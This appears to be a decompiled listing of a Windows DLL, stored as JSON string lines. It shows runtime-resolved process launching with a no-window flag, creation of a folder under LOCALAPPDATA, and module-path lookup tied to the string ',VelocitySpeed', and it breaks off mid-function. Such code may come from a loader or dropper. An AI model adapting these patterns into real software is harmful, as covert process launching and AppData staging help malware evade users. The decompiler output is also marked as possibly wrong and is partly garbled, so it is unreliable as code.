    "    v10 = (void (__stdcall *)(_DWORD, void **, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, _BYTE *, LPCSTR))((int (__stdcall *)(HMODULE, void **))v45)(hLibModule, v9);",
    "    if ( !v10 )",
    "      goto LABEL_26;",
    "    v59 = 0;",
    "    v60 = 0;",
    "    *(_OWORD *)v58 = 0;",
    "    sub_1000A170(v58, Buffer, wcslen(Buffer));",
    "    LOBYTE(v71) = 10;",
    "    sub_10009D70((size_t *)&v37, v58);",
    "    sub_1000AD50((int)Block, (WCHAR *)v37, v38, v39, v40, v41, (unsigned int)v42);",
    "    LOBYTE(v71) = 11;",
    "    v11 = Block;",
    "    v42 = (LPCSTR)hObject;",
    "    if ( v66 > 0xF )",
    "      v11 = (void **)Block[0];",
    "    v10(0, v11, 0, 0, 0, 0x8000000, 0, 0, v48, v42);",
    "    if ( v66 > 0xF )",
    "    {",
    "      v12 = Block[0];",
    "      v13 = (const CHAR *)(v66 + 1);",
    "      if ( v66 + 1 >= 0x1000 )",
    "      {",
    "        v12 = (void *)*((_DWORD *)Block[0] - 1);",
    "        v13 = (const CHAR *)(v66 + 36);",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v12 - 4) > 0x1F )",
    "          goto LABEL_57;",
    "      }",
    "      v42 = v13;",
    "      sub_100154EB(v12);",
    "    }",
    "    Block[4] = 0;",
    "    v66 = 15;",
    "    LOBYTE(Block[0]) = 0;",
    "    if ( v60 <= 7 )",
    "    {",
    "LABEL_26:",
    "      if ( v54 > 0xF )",
    "      {",
    "        v16 = v53[0];",
    "        v17 = (const CHAR *)(v54 + 1);",
    "        if ( v54 + 1 >= 0x1000 )",
    "        {",
    "          v16 = (void *)*((_DWORD *)v53[0] - 1);",
    "          v17 = (const CHAR *)(v54 + 36);",
    "          if ( (unsigned int)((char *)v53[0] - (char *)v16 - 4) > 0x1F )",
    "            _invalid_parameter_noinfo_noreturn();",
    "        }",
    "        v42 = v17;",
    "        sub_100154EB(v16);",
    "      }",
    "      CloseHandle(hObject[1]);",
    "      CloseHandle(hObject[0]);",
    "      FreeLibrary(v8);",
    "      v7 = 1;",
    "      goto LABEL_31;",
    "    }",
    "    v14 = v58[0];",
    "    v15 = (const CHAR *)(2 * v60 + 2);",
    "    if ( (unsigned int)v15 < 0x1000",
    "      || (v14 = (void *)*((_DWORD *)v58[0] - 1),",
    "          v15 = (const CHAR *)(2 * v60 + 37),",
    "          (unsigned int)((char *)v58[0] - (char *)v14 - 4) <= 0x1F) )",
    "    {",
    "      v42 = v15;",
    "      sub_100154EB(v14);",
    "      goto LABEL_26;",
    "    }",
    "LABEL_57:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v7 = 0;",
    "LABEL_31:",
    "  if ( v64 > 0xF )",
    "  {",
    "    v18 = (CHAR *)lpProcName[0];",
    "    v19 = (const CHAR *)(v64 + 1);",
    "    if ( v64 + 1 >= 0x1000 )",
    "    {",
    "      v18 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v19 = (const CHAR *)(v64 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v18 - 4) > 0x1F )",
    "        goto LABEL_59;",
    "    }",
    "    v42 = v19;",
    "    sub_100154EB(v18);",
    "  }",
    "  lpProcName[4] = 0;",
    "  v64 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v62 > 7 )",
    "  {",
    "    v20 = (WCHAR *)lpModuleName[0];",
    "    v21 = (const CHAR *)(2 * v62 + 2);",
    "    if ( (unsigned int)v21 >= 0x1000 )",
    "    {",
    "      v20 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v21 = (const CHAR *)(2 * v62 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v20 - 4) > 0x1F )",
    "        goto LABEL_59;",
    "    }",
    "    v42 = v21;",
    "    sub_100154EB(v20);",
    "  }",
    "  lpModuleName[4] = 0;",
    "  v62 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v68 > 0xF )",
    "  {",
    "    v22 = (CHAR *)lpLibFileName[0];",
    "    v23 = (const CHAR *)(v68 + 1);",
    "    if ( v68 + 1 >= 0x1000 )",
    "    {",
    "      v22 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v23 = (const CHAR *)(v68 + 36);",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v22 - 4) > 0x1F )",
    "        goto LABEL_59;",
    "    }",
    "    v42 = v23;",
    "    sub_100154EB(v22);",
    "  }",
    "  lpLibFileName[4] = 0;",
    "  v68 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( v52 > 0xF )",
    "  {",
    "    v24 = v51[0];",
    "    v25 = (const CHAR *)(v52 + 1);",
    "    if ( v52 + 1 >= 0x1000 )",
    "    {",
    "      v24 = (void *)*((_DWORD *)v51[0] - 1);",
    "      v25 = (const CHAR *)(v52 + 36);",
    "      if ( (unsigned int)((char *)v51[0] - (char *)v24 - 4) > 0x1F )",
    "        goto LABEL_59;",
    "    }",
    "    v42 = v25;",
    "    sub_100154EB(v24);",
    "  }",
    "  v51[4] = 0;",
    "  v52 = 15;",
    "  LOBYTE(v51[0]) = 0;",
    "  if ( v57 > 7 )",
    "  {",
    "    v26 = v55[0];",
    "    v27 = (const CHAR *)(2 * v57 + 2);",
    "    if ( (unsigned int)v27 >= 0x1000 )",
    "    {",
    "      v26 = (void *)*((_DWORD *)v55[0] - 1);",
    "      v27 = (const CHAR *)(2 * v57 + 37);",
    "      if ( (unsigned int)((char *)v55[0] - (char *)v26 - 4) > 0x1F )",
    "        goto LABEL_59;",
    "    }",
    "    v42 = v27;",
    "    sub_100154EB(v26);",
    "  }",
    "LABEL_52:",
    "  if ( v50 > 7 )",
    "  {",
    "    v28 = Format[0];",
    "    v29 = (const CHAR *)(2 * v50 + 2);",
    "    if ( (unsigned int)v29 < 0x1000",
    "      || (v28 = (wchar_t *)*((_DWORD *)Format[0] - 1),",
    "          v29 = (const CHAR *)(2 * v50 + 37),",
    "          (unsigned int)((char *)Format[0] - (char *)v28 - 4) <= 0x1F) )",
    "    {",
    "      v42 = v29;",
    "      sub_100154EB(v28);",
    "      return v7;",
    "    }",
    "LABEL_59:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "CHAR *__thiscall sub_1000CE40(_BYTE *this, CHAR *lpPathName)",
    "{",
    "  void *v2; // edx",
    "  _DWORD *v3; // eax",
    "  const void **v4; // eax",
    "  const void *v5; // esi",
    "  bool v6; // cc",
    "  unsigned int v7; // ecx",
    "  int v8; // edx",
    "  unsigned int v9; // eax",
    "  CHAR *v10; // eax",
    "  CHAR *v11; // esi",
    "  void *v12; // edx",
    "  unsigned int v13; // ecx",
    "  void *v14; // edx",
    "  unsigned int v15; // ecx",
    "  _DWORD *v16; // eax",
    "  const void **v17; // eax",
    "  const void *v18; // esi",
    "  unsigned int v19; // ecx",
    "  int v20; // edx",
    "  unsigned int v21; // eax",
    "  CHAR *v22; // eax",
    "  CHAR *v23; // esi",
    "  void *v24; // edx",
    "  unsigned int v25; // ecx",
    "  void *v26; // edx",
    "  unsigned int v27; // ecx",
    "  CHAR *v28; // eax",
    "  const CHAR *v29; // esi",
    "  const CHAR *v30; // ecx",
    "  int v31; // edx",
    "  _BYTE *v32; // eax",
    "  unsigned int v33; // esi",
    "  int v34; // edx",
    "  const CHAR *v35; // eax",
    "  CHAR *v36; // eax",
    "  const CHAR *v37; // eax",
    "  const CHAR *v38; // eax",
    "  _DWORD *v40; // [esp-30h] [ebp-90h] BYREF",
    "  int v41; // [esp-2Ch] [ebp-8Ch]",
    "  int v42; // [esp-28h] [ebp-88h]",
    "  int v43; // [esp-24h] [ebp-84h]",
    "  unsigned int v44; // [esp-20h] [ebp-80h]",
    "  unsigned int v45; // [esp-1Ch] [ebp-7Ch]",
    "  _DWORD *v46; // [esp-18h] [ebp-78h] BYREF",
    "  int v47; // [esp-14h] [ebp-74h]",
    "  int v48; // [esp-10h] [ebp-70h]",
    "  int v49; // [esp-Ch] [ebp-6Ch]",
    "  unsigned int v50; // [esp-8h] [ebp-68h]",
    "  unsigned int v51; // [esp-4h] [ebp-64h]",
    "  void *v52[5]; // [esp+Ch] [ebp-54h] BYREF",
    "  unsigned int v53; // [esp+20h] [ebp-40h]",
    "  CHAR *v54; // [esp+24h] [ebp-3Ch]",
    "  void *Block[4]; // [esp+28h] [ebp-38h] BYREF",
    "  int v56; // [esp+38h] [ebp-28h]",
    "  unsigned int v57; // [esp+3Ch] [ebp-24h]",
    "  int v58; // [esp+40h] [ebp-20h]",
    "  void *Src; // [esp+44h] [ebp-1Ch]",
    "  _BYTE *v60; // [esp+48h] [ebp-18h]",
    "  int v61; // [esp+4Ch] [ebp-14h]",
    "  int v62; // [esp+5Ch] [ebp-4h]",
    "",
    "  v60 = this;",
    "  v62 = 0;",
    "  v54 = lpPathName;",
    "  v58 = 0;",
    "  v2 = (void *)sub_1001DEE0(\"LOCALAPPDATA\");",
    "  *(_OWORD *)lpPathName = 0;",
    "  *((_DWORD *)lpPathName + 4) = 0;",
    "  *((_DWORD *)lpPathName + 5) = 0;",
    "  sub_100018C0(lpPathName, v2, strlen((const char *)v2));",
    "  v62 = 0;",
    "  v61 = (int)&v46;",
    "  v58 = 3;",
    "  sub_10009E70(&v40, (_DWORD *)(*(_DWORD *)v60 + 648));",
    "  sub_1000B000(&v46, v40, v41, v42, v43, v44, v45);",
    "  v62 = 1;",
    "  sub_10009E70(&v40, (_DWORD *)(*(_DWORD *)v60 + 1848));",
    "  LOBYTE(v62) = 0;",
    "  v3 = sub_1000B970(v52, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51);",
    "  v62 = 2;",
    "  v4 = (const void **)sub_1000A070((int)Block, \"\\\\\", v3);",
    "  LOBYTE(v62) = 3;",
    "  v5 = v4;",
    "  v6 = (unsigned int)v4[5] <= 0xF;",
    "  Src = v4;",
    "  if ( !v6 )",
    "  {",
    "    v5 = *v4;",
    "    Src = (void *)*v4;",
    "  }",
    "  v7 = (unsigned int)v4[4];",
    "  v8 = *((_DWORD *)lpPathName + 4);",
    "  v9 = *((_DWORD *)lpPathName + 5) - v8;",
    "  v61 = v7;",
    "  if ( v7 > v9 )",
    "  {",
    "    LOBYTE(v61) = 0;",
    "    sub_1000A260((void **)lpPathName, v7, v61, v5, v7);",
    "  }",
    "  else",
    "  {",
    "    v6 = *((_DWORD *)lpPathName + 5) <= 0xFu;",
    "    *((_DWORD *)lpPathName + 4) = v8 + v7;",
    "    v10 = lpPathName;",
    "    if ( !v6 )",
    "      v10 = *(CHAR **)lpPathName;",
    "    v11 = &v10[v8];",
    "    memmove(&v10[v8], Src, v7);",
    "    v11[v61] = 0;",
    "  }",
    "  LOBYTE(v62) = 2;",
    "  if ( v57 > 0xF )",
    "  {",
    "    v12 = Block[0];",
    "    v13 = v57 + 1;",
    "    if ( v57 + 1 >= 0x1000 )",
    "    {",
    "      v12 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v13 = v57 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v12 - 4) > 0x1F )",
    "        goto LABEL_44;",
    "    }",
    "    v51 = v13;",
    "    sub_100154EB(v12);",
    "  }",
    "  LOBYTE(v62) = 0;",
    "  v56 = 0;",
    "  v57 = 15;",
    "  LOBYTE(Block[0]) = 0;",
    "  if ( v53 <= 0xF )",
    "    goto LABEL_16;",
    "  v14 = v52[0];",
    "  v15 = v53 + 1;",
    "  if ( v53 + 1 >= 0x1000 )",
    "  {",
    "    v14 = (void *)*((_DWORD *)v52[0] - 1);",
    "    v15 = v53 + 36;",
    "    if ( (unsigned int)((char *)v52[0] - (char *)v14 - 4) > 0x1F )",
    "LABEL_44:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v51 = v15;",
    "  sub_100154EB(v14);",
    "LABEL_16:",
    "  sub_10009E70(&v46, (_DWORD *)(*(_DWORD *)v60 + 1896));",
    "  v16 = sub_1000B000(v52, v46, v47, v48, v49, v50, v51);",
    "  v62 = 4;",
    "  v17 = (const void **)sub_1000A070((int)Block, \"\\\\\", v16);",
    "  LOBYTE(v62) = 5;",
    "  v18 = v17;",
    "  v6 = (unsigned int)v17[5] <= 0xF;",
    "  Src = v17;",
    "  if ( !v6 )",
    "  {",
    "    v18 = *v17;",
    "    Src = (void *)*v17;",
    "  }",
    "  v19 = (unsigned int)v17[4];",
    "  v20 = *((_DWORD *)lpPathName + 4);",
    "  v21 = *((_DWORD *)lpPathName + 5) - v20;",
    "  v61 = v19;",
    "  if ( v19 > v21 )",
    "  {",
    "    LOBYTE(v61) = 0;",
    "    sub_1000A260((void **)lpPathName, v19, v61, v18, v19);",
    "  }",
    "  else",
    "  {",
    "    v6 = *((_DWORD *)lpPathName + 5) <= 0xFu;",
    "    *((_DWORD *)lpPathName + 4) = v20 + v19;",
    "    v22 = lpPathName;",
    "    if ( !v6 )",
    "      v22 = *(CHAR **)lpPathName;",
    "    v23 = &v22[v20];",
    "    memmove(&v22[v20], Src, v19);",
    "    v23[v61] = 0;",
    "  }",
    "  if ( v57 > 0xF )",
    "  {",
    "    v24 = Block[0];",
    "    v25 = v57 + 1;",
    "    if ( v57 + 1 >= 0x1000 )",
    "    {",
    "      v24 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v25 = v57 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v24 - 4) > 0x1F )",
    "        goto LABEL_45;",
    "    }",
    "    v51 = v25;",
    "    sub_100154EB(v24);",
    "  }",
    "  v56 = 0;",
    "  v57 = 15;",
    "  LOBYTE(Block[0]) = 0;",
    "  if ( v53 <= 0xF )",
    "    goto LABEL_31;",
    "  v26 = v52[0];",
    "  v27 = v53 + 1;",
    "  if ( v53 + 1 >= 0x1000 )",
    "  {",
    "    v26 = (void *)*((_DWORD *)v52[0] - 1);",
    "    v27 = v53 + 36;",
    "    if ( (unsigned int)((char *)v52[0] - (char *)v26 - 4) > 0x1F )",
    "LABEL_45:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v51 = v27;",
    "  sub_100154EB(v26);",
    "LABEL_31:",
    "  if ( *((_DWORD *)lpPathName + 5) <= 0xFu )",
    "  {",
    "    v29 = &lpPathName[*((_DWORD *)lpPathName + 4)];",
    "    v30 = v29;",
    "    v28 = lpPathName;",
    "  }",
    "  else",
    "  {",
    "    v28 = *(CHAR **)lpPathName;",
    "    v29 = (const CHAR *)(*((_DWORD *)lpPathName + 4) + *(_DWORD *)lpPathName);",
    "    v30 = v29;",
    "  }",
    "  v31 = sub_100153A0(v28, v30, 0);",
    "  v32 = (_BYTE *)*((_DWORD *)lpPathName + 4);",
    "  v33 = (unsigned int)&v29[-v31];",
    "  v60 = v32;",
    "  if ( *((_DWORD *)lpPathName + 5) <= 0xFu )",
    "  {",
    "    v34 = v31 - (_DWORD)lpPathName;",
    "    v37 = &v32[-v34];",
    "    if ( (unsigned int)v37 < v33 )",
    "      v33 = (unsigned int)v37;",
    "    v36 = lpPathName;",
    "  }",
    "  else",
    "  {",
    "    v34 = v31 - *(_DWORD *)lpPathName;",
    "    v35 = &v32[-v34];",
    "    if ( (unsigned int)v35 < v33 )",
    "      v33 = (unsigned int)v35;",
    "    v36 = *(CHAR **)lpPathName;",
    "  }",
    "  v60 -= v33;",
    "  memmove(&v36[v34], &v36[v34 + v33], (size_t)&v60[-v34 + 1]);",
    "  *((_DWORD *)lpPathName + 4) = v60;",
    "  v38 = lpPathName;",
    "  if ( *((_DWORD *)lpPathName + 5) > 0xFu )",
    "    v38 = *(const CHAR **)lpPathName;",
    "  CreateDirectoryA(v38, 0);",
    "  return lpPathName;",
    "}",
    "",
    "",
    "// positive sp value has been detected, the output may be wrong!",
    "char sub_1000D1E0()",
    "{",
    "}char __thiscall sub_1000D290(_BYTE *this)",
    "{",
    "  CHAR *v2; // eax",
    "  CHAR *v3; // ecx",
    "  CHAR *v4; // eax",
    "  int v5; // eax",
    "  CHAR *v6; // ecx",
    "  int v7; // edi",
    "  char *v8; // ecx",
    "  CHAR *v9; // ecx",
    "  size_t v10; // esi",
    "  _DWORD *v11; // edi",
    "  unsigned int v12; // esi",
    "  int v13; // ecx",
    "  unsigned int v14; // edx",
    "  int v15; // esi",
    "  size_t v16; // esi",
    "  void *v17; // edx",
    "  unsigned int v18; // ecx",
    "  int v19; // ecx",
    "  void **v20; // edx",
    "  int v21; // edi",
    "  void **v22; // esi",
    "  void **v23; // edx",
    "  void **v24; // eax",
    "  char *v25; // ecx",
    "  void **v26; // eax",
    "  int v27; // eax",
    "  void **v28; // ecx",
    "  int v29; // edi",
    "  unsigned int v30; // ecx",
    "  void **v31; // eax",
    "  int v32; // esi",
    "  void **v33; // edx",
    "  void **v34; // eax",
    "  char *v35; // ecx",
    "  void **v36; // eax",
    "  int v37; // eax",
    "  void **v38; // ecx",
    "  int v39; // edi",
    "  unsigned int v40; // ecx",
    "  void **v41; // eax",
    "  int v42; // esi",
    "  int v43; // ecx",
    "  void **v44; // eax",
    "  void **v45; // edx",
    "  int v46; // ecx",
    "  int v47; // edi",
    "  void **v48; // esi",
    "  void **v49; // edx",
    "  int v50; // ecx",
    "  int v51; // edi",
    "  void **v52; // esi",
    "  void **v53; // eax",
    "  void **v54; // edx",
    "  void **v55; // eax",
    "  char *v56; // ecx",
    "  void **v57; // eax",
    "  int v58; // eax",
    "  void **v59; // ecx",
    "  int v60; // edi",
    "  unsigned int v61; // ecx",
    "  void **v62; // eax",
    "  int v63; // esi",
    "  _DWORD *v64; // edi",
    "  int *p_bufsiz; // eax",
    "  void **v66; // edx",
    "  void **v67; // eax",
    "  char *v68; // ecx",
    "  void **v69; // eax",
    "  int v70; // eax",
    "  void **v71; // ecx",
    "  int v72; // edi",
    "  unsigned int v73; // ecx",
    "  void **v74; // eax",
    "  int v75; // esi",
    "  void **v76; // eax",
    "  void **v77; // edx",
    "  int v78; // ecx",
    "  int v79; // edi",
    "  void **v80; // esi",
    "  void **v81; // eax",
    "  void *v82; // edx",
    "  unsigned int v83; // ecx",
    "  void **v84; // eax",
    "  void **v85; // eax",
    "  const char *v86; // ecx",
    "  void **v87; // eax",
    "  int v88; // eax",
    "  void **v89; // ecx",
    "  int v90; // edi",
    "  char *v91; // ecx",
    "  void **v92; // ecx",
    "  size_t v93; // esi",
    "  HWND ConsoleWindow; // eax",
    "  void **v95; // eax",
    "  void **v96; // eax",
    "  const char *v97; // ecx",
    "  void **v98; // eax",
    "  int v99; // eax",
    "  void **v100; // ecx",
    "  int v101; // edi",
    "  CHAR *v102; // ecx",
    "  void **v103; // ecx",
    "  const CHAR *v104; // esi",
    "  void **v105; // eax",
    "  void **v106; // eax",
    "  const char *v107; // ecx",
    "  void **v108; // eax",
    "  int v109; // eax",
    "  void **v110; // ecx",
    "  int v111; // edi",
    "  char *v112; // ecx",
    "  void **v113; // ecx",
    "  size_t v114; // esi",
    "  void **v115; // eax",
    "  void **v116; // eax",
    "  const char *v117; // ecx",
    "  void **v118; // eax",
    "  int v119; // eax",
    "  void **v120; // ecx",
    "  int v121; // edi",
    "  CHAR *v122; // ecx",
    "  void **v123; // ecx",
    "  const CHAR *v124; // esi",
    "  void **v125; // eax",
    "  void **v126; // ecx",
    "  void **v127; // eax",
    "  int v128; // eax",
    "  void **v129; // ecx",
    "  int v130; // edi",
    "  char *v131; // ecx",
    "  void **v132; // ecx",
    "  size_t v133; // esi",
    "  void **v134; // eax",
    "  void **v135; // eax",
    "  const char *v136; // ecx",
    "  void **v137; // eax",
    "  int v138; // eax",
    "  void **v139; // ecx",
    "  int v140; // edi",
    "  CHAR *v141; // ecx",
    "  void **v142; // ecx",
    "  const CHAR *v143; // esi",
    "  int v144; // ecx",
    "  void **v145; // eax",
    "  void **v146; // ecx",
    "  size_t v147; // edi",
    "  int v148; // edx",
    "  void **v149; // eax",
    "  char *v150; // esi",
    "  int v151; // ecx",
    "  void **v152; // eax",
    "  void **v153; // esi",
    "  _BYTE *v154; // esi",
    "  int v155; // ecx",
    "  void **v156; // eax",
    "  void **v157; // ecx",
    "  size_t v158; // edi",
    "  int v159; // edx",
    "  void **v160; // eax",
    "  char *v161; // esi",
    "  int v162; // ecx",
    "  void **v163; // eax",
    "  void **v164; // ecx",
    "  size_t v165; // edi",
    "  int v166; // edx",
    "  void **v167; // eax",
    "  char *v168; // esi",
    "  int v169; // ecx",
    "  void **v170; // eax",
    "  int v171; // ecx",
    "  void **v172; // eax",
    "  void **v173; // ecx",
    "  size_t v174; // edi",
    "  int v175; // edx",
    "  void **v176; // eax",
    "  char *v177; // esi",
    "  CHAR *v178; // eax",
    "  HWND v179; // eax",
    "  const CHAR *v180; // eax",
    "  const CHAR *v181; // eax",
    "  char *ptr; // edx",
    "  int v183; // ecx",
    "  void *v184; // edx",
    "  size_t v185; // ecx",
    "  void *v186; // edx",
    "  unsigned int v187; // ecx",
    "  CHAR *v188; // edx",
    "  size_t v189; // ecx",
    "  void *v190; // edx",
    "  size_t v191; // ecx",
    "  void *v192; // edx",
    "  size_t v193; // ecx",
    "  void *v194; // edx",
    "  size_t v195; // ecx",
    "  void *v196; // edx",
    "  size_t v197; // ecx",
    "  void *v198; // edx",
    "  size_t v199; // ecx",
    "  void *v200; // edx",
    "  size_t v201; // ecx",
    "  void *v202; // edx",
    "  size_t v203; // ecx",
    "  void *v204; // edx",
    "  size_t v205; // ecx",
    "  void *v206; // edx",
    "  unsigned int v207; // ecx",
    "  void *v208; // edx",
    "  unsigned int v209; // ecx",
    "  void *bufsiz; // edx",
    "  unsigned int v211; // ecx",
    "  void *v212; // edx",
    "  unsigned int v213; // ecx",
    "  void *v214; // edx",
    "  unsigned int v215; // ecx",
    "  void *v216; // edx",
    "  unsigned int v217; // ecx",
    "  void *v218; // edx",
    "  size_t v219; // ecx",
    "  unsigned int v220; // ecx",
    "  CHAR *v221; // eax",
    "  char *v222; // edx",
    "  void *v223; // edx",
    "  unsigned int v224; // ecx",
    "  void *v225; // edx",
    "  unsigned int v226; // ecx",
    "  CHAR *v227; // edx",
    "  size_t v228; // ecx",
    "  _DWORD *v230; // [esp-30h] [ebp-490h] BYREF",
    "  int v231; // [esp-2Ch] [ebp-48Ch]",
    "  int v232; // [esp-28h] [ebp-488h]",
    "  int v233; // [esp-24h] [ebp-484h]",
    "  unsigned int v234; // [esp-20h] [ebp-480h]",
    "  unsigned int v235; // [esp-1Ch] [ebp-47Ch]",
    "  __int128 v236; // [esp-18h] [ebp-478h] BYREF",
    "  const char *v237; // [esp-8h] [ebp-468h]",
    "  size_t v238; // [esp-4h] [ebp-464h]",
    "  _DWORD *v239; // [esp+Ch] [ebp-454h]",
    "  int v240; // [esp+10h] [ebp-450h]",
    "  void *v241; // [esp+14h] [ebp-44Ch]",
    "  LPCCH lpMultiByteStr; // [esp+18h] [ebp-448h]",
    "  HMODULE phModule; // [esp+1Ch] [ebp-444h] BYREF",
    "  void *v244[4]; // [esp+20h] [ebp-440h] BYREF",
    "  __int64 v245; // [esp+30h] [ebp-430h]",
    "  void *v246[4]; // [esp+38h] [ebp-428h] BYREF",
    "  int v247; // [esp+48h] [ebp-418h]",
    "  unsigned int v248; // [esp+4Ch] [ebp-414h]",
    "  void *v249[5]; // [esp+50h] [ebp-410h] BYREF",
    "  unsigned int v250; // [esp+64h] [ebp-3FCh]",
    "  void *v251[5]; // [esp+68h] [ebp-3F8h] BYREF",
    "  unsigned int v252; // [esp+7Ch] [ebp-3E4h]",
    "  FILE v253; // [esp+80h] [ebp-3E0h] BYREF",
    "  int v254; // [esp+A8h] [ebp-3B8h]",
    "  unsigned int v255; // [esp+ACh] [ebp-3B4h]",
    "  void *v256[4]; // [esp+B0h] [ebp-3B0h] BYREF",
    "  size_t Size; // [esp+C0h] [ebp-3A0h]",
    "  unsigned int v258; // [esp+C4h] [ebp-39Ch]",
    "  void *Src[4]; // [esp+C8h] [ebp-398h] BYREF",
    "  int v260[2]; // [esp+D8h] [ebp-388h]",
    "  LPCSTR lpCmdLine[5]; // [esp+E0h] [ebp-380h] BYREF",
    "  unsigned int v262; // [esp+F4h] [ebp-36Ch]",
    "  void *v263[4]; // [esp+F8h] [ebp-368h] BYREF",
    "  const CHAR *v264; // [esp+108h] [ebp-358h]",
    "  unsigned int v265; // [esp+10Ch] [ebp-354h]",
    "  void *v266[4]; // [esp+110h] [ebp-350h] BYREF",
    "  const CHAR *v267; // [esp+120h] [ebp-340h]",
    "  unsigned int v268; // [esp+124h] [ebp-33Ch]",
    "  void *v269[4]; // [esp+128h] [ebp-338h] BYREF",
    "  const CHAR *v270; // [esp+138h] [ebp-328h]",
    "  unsigned int v271; // [esp+13Ch] [ebp-324h]",
    "  CHAR PathName[16]; // [esp+140h] [ebp-320h] BYREF",
    "  size_t v273; // [esp+150h] [ebp-310h]",
    "  unsigned int v274; // [esp+154h] [ebp-30Ch]",
    "  void *v275[4]; // [esp+158h] [ebp-308h] BYREF",
    "  int v276; // [esp+168h] [ebp-2F8h]",
    "  unsigned int v277; // [esp+16Ch] [ebp-2F4h]",
    "  void *v278[4]; // [esp+170h] [ebp-2F0h] BYREF",
    "  int v279; // [esp+180h] [ebp-2E0h]",
    "  unsigned int v280; // [esp+184h] [ebp-2DCh]",
    "  void *v281[4]; // [esp+188h] [ebp-2D8h] BYREF",
    "  int v282; // [esp+198h] [ebp-2C8h]",
    "  unsigned int v283; // [esp+19Ch] [ebp-2C4h]",
    "  void *v284[4]; // [esp+1A0h] [ebp-2C0h] BYREF",
    "  size_t v285; // [esp+1B0h] [ebp-2B0h]",
    "  unsigned int v286; // [esp+1B4h] [ebp-2ACh]",
    "  void *v287[4]; // [esp+1B8h] [ebp-2A8h] BYREF",
    "  size_t v288; // [esp+1C8h] [ebp-298h]",
    "  unsigned int v289; // [esp+1CCh] [ebp-294h]",
    "  void *v290[4]; // [esp+1D0h] [ebp-290h] BYREF",
    "  size_t v291; // [esp+1E0h] [ebp-280h]",
    "  unsigned int v292; // [esp+1E4h] [ebp-27Ch]",
    "  void *v293[4]; // [esp+1E8h] [ebp-278h] BYREF",
    "  int v294; // [esp+1F8h] [ebp-268h]",
    "  unsigned int v295; // [esp+1FCh] [ebp-264h]",
    "  void *Block[4]; // [esp+200h] [ebp-260h] BYREF",
    "  int v297; // [esp+210h] [ebp-250h]",
    "  unsigned int v298; // [esp+214h] [ebp-24Ch]",
    "  void *v299[4]; // [esp+218h] [ebp-248h] BYREF",
    "  int v300; // [esp+228h] [ebp-238h]",
    "  unsigned int v301; // [esp+22Ch] [ebp-234h]",
    "  void *v302[4]; // [esp+230h] [ebp-230h] BYREF",
    "  int v303; // [esp+240h] [ebp-220h]",
    "  unsigned int v304; // [esp+244h] [ebp-21Ch]",
    "  WCHAR Filename[260]; // [esp+248h] [ebp-218h] BYREF",
    "  int v306; // [esp+45Ch] [ebp-4h]",
    "",
    "  phModule = 0;",
    "  memset(Filename, 0, sizeof(Filename));",
    "  GetModuleHandleExW(6u, L\",VelocitySpeed\", &phModule);",
    "  GetModuleFileNameW(phModule, Filename, 0x104u);",
    "  v239 = (_DWORD *)sub_10002FE0();",
    "  sub_1000CE40(this, PathName);",
    "  v306 = 0;",
    "  v2 = PathName;",
    "  v3 = PathName;",
    "  v238 = 0;",
    "  if ( v274 > 0xF )",
    "    v2 = *(CHAR **)PathName;",
    "  v241 = &v2[v273];",
    "  v4 = PathName;",
    "  if ( v274 > 0xF )",
    "    v3 = *(CHAR **)PathName;",
    "  v237 = &v3[v273];",
    "  if ( v274 > 0xF )",
    "    v4 = *(CHAR **)PathName;",
    "  v5 = sub_100153A0(v4, v237, v238);",
    "  v6 = PathName;",
    "  if ( v274 > 0xF )",
    "    v6 = *(CHAR **)PathName;",
    "  v7 = v5 - (_DWORD)v6;",
    "  v8 = (char *)v241 - v5;",
    "  v240 = v273;",
    "  if ( (char *)(v273 - v7) < (char *)v241 - v5 )",
    "    v8 = (char *)(v273 - v7);",
    "  v241 = v8;",
    "  v9 = PathName;",
    "  if ( v274 > 0xF )",
    "    v9 = *(CHAR **)PathName;",
    "  v10 = v273 - (_DWORD)v241;",
    "  memmove(&v9[v7], &v9[v7 + (_DWORD)v241], v273 - (_DWORD)v241 - v7 + 1);",
    "  v273 = v10;",
    "  v247 = 0;",
    "  v248 = 0;",
    "  *(_OWORD *)v246 = 0;",
    "  sub_1000A170(v246, Filename, wcslen(Filename));",
    "  LOBYTE(v306) = 1;",
    "  sub_10009E70(&v236, PathName);",
    "  sub_1000AA30((int)v293, (CHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 2;",
    "  sub_10009E70(&v230, v239 + 450);",
    "  sub_1000B000(&v236, v230, v231, v232, v233, v234, v235);",
    "  v11 = (_DWORD *)sub_1000AA30((int)Block, (CHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 3;",
    "  v12 = v11[5];",
    "  v13 = v11[4];",
    "  v240 = v13;",
    "  if ( v12 == v13 )",
    "  {",
    "    LOBYTE(v240) = 0;",
    "    v11 = (_DWORD *)sub_10011950(v11, 1, v240, SHIDWORD(v236), (int)v237, 1);",
    "  }",
    "  else",
    "  {",
    "    v241 = v11;",
    "    v11[4] = v13 + 1;",
    "    v14 = (unsigned int)v11;",
    "    if ( v12 > 7 )",
    "    {",
    "      v14 = *v11;",
    "      v241 = (void *)*v11;",
    "    }",
